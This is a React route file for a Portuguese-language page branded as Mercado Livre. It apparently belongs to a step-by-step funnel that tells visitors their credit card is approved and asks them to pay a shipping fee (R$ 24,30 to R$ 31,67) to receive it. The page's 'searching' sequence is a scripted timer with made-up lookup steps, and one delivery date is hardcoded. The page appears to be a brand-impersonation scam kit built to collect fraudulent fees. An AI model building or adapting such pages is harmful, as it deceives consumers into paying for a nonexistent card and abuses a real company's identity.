import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import sedexLogo from "@/assets/sedex-logo.png";
import pacLogo from "@/assets/pac-logo.png";
import loggiLogo from "@/assets/loggi-logo.png";
import { FunnelSteps } from "@/components/FunnelSteps";

export const Route = createFileRoute("/envio")({
  head: () => ({
    meta: [
      { title: "Método de envio - Mercado Livre" },
      { name: "description", content: "Escolha o método de envio do seu cartão de crédito aprovado." },
    ],
  }),
  component: Envio,
});

type Stage = "confirm" | "searching" | "options";

const searchSteps = [
  "Localizando agência mais próxima",
  "Calculando rota de entrega",
  "Verificando prazos disponíveis",
  "Consultando frete Correios",
];

function addBusinessDays(from: Date, days: number) {
  const d = new Date(from);
  let added = 0;
  while (added < days) {
    d.setDate(d.getDate() + 1);
    const dow = d.getDay();
    if (dow !== 0 && dow !== 6) added++;
  }
  return d;
}
function fmtBR(d: Date) {
  const dd = String(d.getDate()).padStart(2, "0");
  const mm = String(d.getMonth() + 1).padStart(2, "0");
  return `${dd}/${mm}`;
}

function Envio() {
  const today = new Date();
  const sedexDate = fmtBR(addBusinessDays(today, 3));
  const loggiDate = fmtBR(addBusinessDays(today, 1));
  const pacStart = fmtBR(addBusinessDays(today, 15));
  const pacEnd = fmtBR(addBusinessDays(today, 20));
  const navigate = useNavigate();
  const [stage, setStage] = useState<Stage>("confirm");
  const [stepIdx, setStepIdx] = useState(0);

  // pega cidade/estado/cep dos params (vindo do /endereco)
  const [cidade, setCidade] = useState("");
  const [estado, setEstado] = useState("");
  const [cep, setCep] = useState("");
  const [cardColor, setCardColor] = useState("#3483FA");

  useEffect(() => {
    if (typeof window === "undefined") return;
    const sp = new URLSearchParams(window.location.search);
    setCidade(sp.get("cidade") || "");
    setEstado(sp.get("estado") || "");
    setCep(sp.get("cep") || "");
    try {
      const c = sessionStorage.getItem("cardColor");
      if (c) setCardColor(c);
    } catch {}
  }, []);

  useEffect(() => {
    if (stage !== "searching") return;
    setStepIdx(0);
    const perStep = 2200; // ~10s total
    const timers: ReturnType<typeof setTimeout>[] = [];
    searchSteps.forEach((_, i) => {
      timers.push(setTimeout(() => setStepIdx(i + 1), (i + 1) * perStep));
    });
    timers.push(setTimeout(() => setStage("options"), searchSteps.length * perStep + 400));
    return () => timers.forEach(clearTimeout);
  }, [stage]);

  const handleSelect = (method: "sedex" | "pac" | "loggi") => {
    const current = typeof window !== "undefined" ? window.location.search : "";
    const sp = new URLSearchParams(current);
    sp.set("metodo", method);
    navigate({ to: "/confirmacao", search: Object.fromEntries(sp) as never });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <FunnelSteps current={4} />

      <main className="flex-1 flex items-start justify-center px-4 py-6">
        <div className="w-full max-w-md bg-white rounded-xl shadow-sm p-6 md:p-8">
          {stage === "confirm" && (
            <>
              <h1 className="text-2xl font-bold text-gray-800 text-center mb-3">
                Confirme sua cidade
              </h1>
              <p className="text-sm text-gray-600 text-center mb-6 leading-relaxed">
                Vamos calcular o frete de entrega do seu cartão até esse endereço.
              </p>

              <div className="border-2 border-[#FFE600] rounded-xl p-5 mb-5 bg-[#FFFBE0]">
                <div className="flex items-start gap-3">
                  <div className="w-11 h-11 rounded-full bg-[#FFE600] flex items-center justify-center shrink-0">
                    <svg viewBox="0 0 24 24" className="w-6 h-6 text-gray-900" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 1 1 18 0z" />
                      <circle cx="12" cy="10" r="3" />
                    </svg>
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="text-xs uppercase tracking-wider text-gray-500 font-semibold">Entrega para</div>
                    <div className="text-lg font-bold text-gray-900 truncate">
                      {cidade || "Sua cidade"}{estado ? ` - ${estado}` : ""}
                    </div>
                    {cep && <div className="text-xs text-gray-600 mt-0.5">CEP {cep}</div>}
                  </div>
                </div>
              </div>

              <button
                onClick={() => setStage("searching")}
                className="w-full bg-[#2A68C8] hover:bg-[#1E5BBA] text-white font-bold py-4 rounded-lg shadow-md transition-colors"
              >
                Confirmar e calcular frete
              </button>
              <button
                onClick={() => navigate({ to: "/endereco" })}
                className="w-full mt-3 text-sm text-gray-600 hover:text-gray-900 font-medium py-2"
              >
                Alterar endereço
              </button>
            </>
          )}

          {stage === "searching" && (
            <>
              <h1 className="text-xl font-bold text-gray-800 text-center mb-1">
                Buscando opções de envio
              </h1>
              <p className="text-sm text-gray-600 text-center mb-6">
                Calculando frete até {cidade ? `${cidade}${estado ? `/${estado}` : ""}` : "seu endereço"}
              </p>

              {/* Cena de transportadora */}
              <div className="relative h-48 rounded-xl overflow-hidden bg-gradient-to-b from-[#E8F1FF] to-[#F7FAFF] border border-gray-200 mb-6">
                {/* céu / grade sutil */}
                <div
                  className="absolute inset-0 opacity-40"
                  style={{
                    backgroundImage:
                      "linear-gradient(0deg, rgba(0,80,180,.08) 1px, transparent 1px), linear-gradient(90deg, rgba(0,80,180,.08) 1px, transparent 1px)",
                    backgroundSize: "26px 26px",
                  }}
                />

                {/* Centro de Distribuição (esquerda) */}
                <div className="absolute left-3 bottom-10 flex flex-col items-center z-10">
                  <svg viewBox="0 0 48 40" className="w-12 h-10 drop-shadow-sm">
                    <rect x="4" y="14" width="40" height="22" fill="#ffffff" stroke="#0050B4" strokeWidth="2" />
                    <polygon points="2,16 24,2 46,16" fill="#FFE600" stroke="#0050B4" strokeWidth="2" />
                    <rect x="20" y="22" width="8" height="14" fill="#0050B4" />
                    <rect x="9" y="20" width="6" height="5" fill="#EAF2FE" stroke="#0050B4" strokeWidth="1" />
                    <rect x="33" y="20" width="6" height="5" fill="#EAF2FE" stroke="#0050B4" strokeWidth="1" />
                  </svg>
                  <span className="text-[10px] font-bold text-gray-700 mt-1">CD Origem</span>
                </div>

                {/* Pino de destino (direita) */}
                <div className="absolute right-3 top-4 flex flex-col items-center z-10">
                  <div className="w-10 h-10 rounded-full bg-[#FFE600] border-2 border-gray-900 flex items-center justify-center shadow-md">
                    <svg viewBox="0 0 24 24" className="w-5 h-5" fill="#D32F2F" stroke="#0d0d0d" strokeWidth="1.2">
                      <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 010-5 2.5 2.5 0 010 5z"/>
                    </svg>
                  </div>
                  <span className="text-[10px] font-bold text-gray-900 mt-1 max-w-[90px] truncate">
                    {cidade || "Destino"}
                  </span>
                </div>

                {/* Estrada + caminhão animado */}
                <svg className="absolute inset-0 w-full h-full" viewBox="0 0 400 200" preserveAspectRatio="none">
                  <defs>
                    <path id="rota" d="M40 160 Q 140 60 220 130 T 370 50" />
                  </defs>
                  <use href="#rota" stroke="#0050B4" strokeWidth="2.5" strokeDasharray="6 6" fill="none" />
                  {/* Cartão percorrendo a rota */}
                  <g>
                    <g transform="translate(-16,-10)">
                      <rect x="0" y="0" width="32" height="20" rx="3" fill={cardColor} stroke="#0d0d0d" strokeWidth="1.2" />
                      <rect x="3" y="4" width="7" height="5" rx="1" fill="#E8C658" stroke="#0d0d0d" strokeWidth="0.4" />
                      <rect x="3" y="14" width="14" height="1.2" fill={cardColor === "#FFE600" ? "#0d0d0d" : "#ffffff"} opacity="0.7" />
                      <circle cx="25" cy="14" r="2.2" fill="#EB001B" opacity="0.9" />
                      <circle cx="28" cy="14" r="2.2" fill="#F79E1B" opacity="0.9" />
                    </g>
                    <animateMotion dur="2.8s" repeatCount="indefinite" rotate="auto">
                      <mpath href="#rota" />
                    </animateMotion>
                  </g>

                </svg>

                {/* badge "rastreando" */}
                <div className="absolute top-2 left-2 bg-white/90 backdrop-blur px-2 py-1 rounded-full border border-gray-200 flex items-center gap-1.5 shadow-sm">
                  <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
                  <span className="text-[10px] font-bold text-gray-700 tracking-wide">RASTREANDO</span>
                </div>


              </div>

              <div className="space-y-3">
                {searchSteps.map((label, i) => {
                  const done = i < stepIdx;
                  const active = i === stepIdx;
                  return (
                    <div key={label} className="flex items-center gap-3">
                      {done ? (
                        <span className="w-6 h-6 rounded-full bg-[#FFE600] text-gray-900 flex items-center justify-center text-xs font-bold shrink-0">✓</span>
                      ) : active ? (
                        <span className="w-6 h-6 rounded-full border-2 border-[#FFE600] border-t-transparent animate-spin shrink-0" />
                      ) : (
                        <span className="w-6 h-6 rounded-full border border-gray-300 shrink-0" />
                      )}
                      <span className={`text-sm ${done || active ? "text-gray-800 font-semibold" : "text-gray-400"}`}>
                        {label}
                      </span>
                    </div>
                  );
                })}
              </div>
            </>
          )}

          {stage === "options" && (
            <>
              <h1 className="text-2xl font-bold text-gray-800 text-center mb-3">
                Escolha o método de envio
              </h1>
              <p className="text-sm text-gray-600 text-center mb-3 leading-relaxed">
                Entrega para <span className="font-bold text-gray-900">{cidade || "sua cidade"}{estado ? ` - ${estado}` : ""}</span>
              </p>
              <div className="text-center text-[11px] font-bold text-[#2A68C8] mb-4 uppercase tracking-wider">
                👇 Toque em uma opção para continuar
              </div>

              <button
                onClick={() => handleSelect("sedex")}
                className="group w-full border-2 border-[#FFE600] bg-[#FFFBE0]/40 rounded-xl p-4 mb-3 flex items-center gap-3 hover:shadow-md active:scale-[0.99] transition-all text-left relative"
              >
                <div className="w-16 h-14 rounded-lg bg-white border border-gray-200 flex items-center justify-center shrink-0 p-1.5">
                  <img src={sedexLogo} alt="SEDEX" className="max-h-full max-w-full object-contain" />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-2 mb-1">
                    <div className="font-bold text-gray-800">SEDEX</div>
                    <div className="bg-[#FFE600] text-gray-900 text-[9px] font-bold py-0.5 px-2 rounded-full whitespace-nowrap">
                      MAIS POPULAR
                    </div>
                  </div>
                  <div className="text-xs text-gray-600">3 dias úteis</div>
                  <div className="text-[11px] text-gray-900 font-semibold">
                    ✓ Rastreamento incluído
                  </div>
                  <div className="flex items-end justify-between mt-1">
                    <div className="text-[10px] text-gray-500 italic">Chegará até {sedexDate}</div>
                    <div className="font-extrabold text-gray-900 text-base">R$ 29,90</div>
                  </div>
                </div>
                <span className="absolute right-2 top-1/2 -translate-y-1/2 text-[#2A68C8] opacity-0 group-hover:opacity-100 transition-opacity">›</span>
              </button>

              <button
                onClick={() => handleSelect("loggi")}
                className="w-full border border-gray-200 rounded-xl p-4 mb-3 flex items-center gap-3 hover:border-[#FFE600] hover:shadow-sm active:scale-[0.99] transition-all text-left bg-white"
              >
                <div className="w-16 h-14 rounded-lg bg-white border border-gray-200 flex items-center justify-center shrink-0 p-0.5 overflow-hidden">
                  <img src={loggiLogo} alt="Loggi" className="w-full h-full object-contain scale-125" />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-2 mb-1">
                    <div className="font-bold text-gray-800">Loggi</div>
                    <div className="font-extrabold text-gray-900 whitespace-nowrap text-base">R$ 31,67</div>
                  </div>
                  <div className="text-xs text-gray-600">1 dia útil</div>
                  <div className="text-[11px] text-gray-900 font-semibold">
                    ✓ Rastreamento em tempo real
                  </div>
                  <div className="text-[10px] text-gray-500 italic mt-0.5">Chegará até {loggiDate}</div>
                </div>
              </button>

              <button
                onClick={() => handleSelect("pac")}
                className="w-full border border-gray-200 rounded-xl p-4 flex items-center gap-3 hover:border-[#FFE600] hover:shadow-sm active:scale-[0.99] transition-all text-left bg-white"
              >
                <div className="w-16 h-14 rounded-lg bg-white border border-gray-200 flex items-center justify-center shrink-0 p-1.5">
                  <img src={pacLogo} alt="PAC" className="max-h-full max-w-full object-contain" />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-2 mb-1">
                    <div className="font-bold text-gray-800">PAC</div>
                    <div className="font-extrabold text-gray-900 whitespace-nowrap text-base">R$ 24,30</div>
                  </div>
                  <div className="text-xs text-gray-600">15-20 dias úteis</div>
                  <div className="text-[11px] text-gray-900 font-semibold">
                    ✓ Rastreamento incluído
                  </div>
                  <div className="text-[10px] text-gray-500 italic mt-0.5">Chegará entre 17/06 a 24/06</div>
                </div>
              </button>
            </>
          )}
        </div>
      </main>
    </div>
  );
}
